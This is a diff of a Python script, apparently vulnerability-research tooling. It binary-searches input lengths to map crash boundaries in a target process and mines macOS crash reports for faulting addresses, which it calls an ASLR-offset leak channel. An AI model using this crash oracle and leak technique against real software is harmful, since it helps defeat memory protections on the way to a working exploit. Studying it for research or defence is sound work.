@@ -69,10 +69,12 @@ def bsearch(lo, hi, lo_expect, hi_expect, tag, step=128):
 T("=== RIP-38 ORACLE START (blind, fresh-process rc channel) ===")
 B1 = bsearch(8192, 24576, "survive", "crash", "survive->crash")
 T("ORACLE-B1 (smallest non-survive L) = %d (prior ground truth ~16000-17000)" % B1)
-B2 = bsearch(28672, 40960, "crash", "graceful", "crash->graceful")
-T("ORACLE-B2 (smallest graceful L) = %d (prior ground truth 32768)" % B2)
-match = abs(B2 - 32768) <= 256
-T("ORACLE-B2 MATCH: %s (delta %+d)" % ("YES" if match else "NO", B2 - 32768))
+# negative band: crash [-27648,-17408] vs survive [-16384,-256] (GT RIP-4) — int16-safe
+B2 = bsearch(-20480, -12288, "crash", "survive", "neg-crash->survive")
+T("ORACLE-B2NEG (first survive above neg crash band) = %d (prior GT: boundary in (-17408,-16384))" % B2)
+match1 = 16000 <= B1 <= 17408
+match2 = -17408 <= B2 <= -16384
+T("ORACLE-B1 MATCH: %s | ORACLE-B2NEG MATCH: %s" % ("YES" if match1 else "NO", "YES" if match2 else "NO"))
 
 # --- .ips harvest (fa = x27 - Delta class -> ASLR-offset leak channel) ---
 t0file = T0 - 5
@@ -88,17 +90,22 @@ for p in ipss[:40]:
         lines = open(p, errors="ignore").read().split("\n", 1)
         body = json.loads(lines[1]) if len(lines) > 1 else {}
         ex = body.get("exception", {})
+        if len(fas) == 0:
+            T("ips[0] exception-raw: %s" % json.dumps(ex)[:220])
         fa = ex.get("address") or ex.get("faultingAddress") or body.get("faultingAddress")
+        if fa is None:
+            for k in ("faultingAddress", "address"):
+                if k in body: fa = body[k]; break
         ty = ex.get("type", "?")
         if fa is not None: fas.append((os.path.basename(p), ty, fa))
-    except Exception as e:
+    except Exception:
         pass
 for nm, ty, fa in fas[:20]:
     T("ips %s %s fa=%s" % (nm[:40], ty, hex(int(fa)) if isinstance(fa, int) else fa))
 uniq = sorted(set(int(fa) for _, _, fa in fas if isinstance(fa, int)))
 T("distinct fa count=%d; fa span=%s" % (len(uniq), ("0x%x..0x%x" % (uniq[0], uniq[-1])) if uniq else "n/a"))
 
-verdict = "ORACLE-LIVE blind-boundaries B1=%d B2=%d (B2 vs GT 32768: %s)" % (B1, B2, "MATCH" if match else "NOMATCH")
+verdict = "ORACLE-LIVE blind-boundaries B1=%d(%s) B2NEG=%d(%s)" % (B1, "MATCH" if match1 else "NO", B2, "MATCH" if match2 else "NO")
 T("RESULT: %s" % verdict)
 T("RIP-38 DONE (%.1fs total)" % (time.time() - T0))
 TRACE.close()
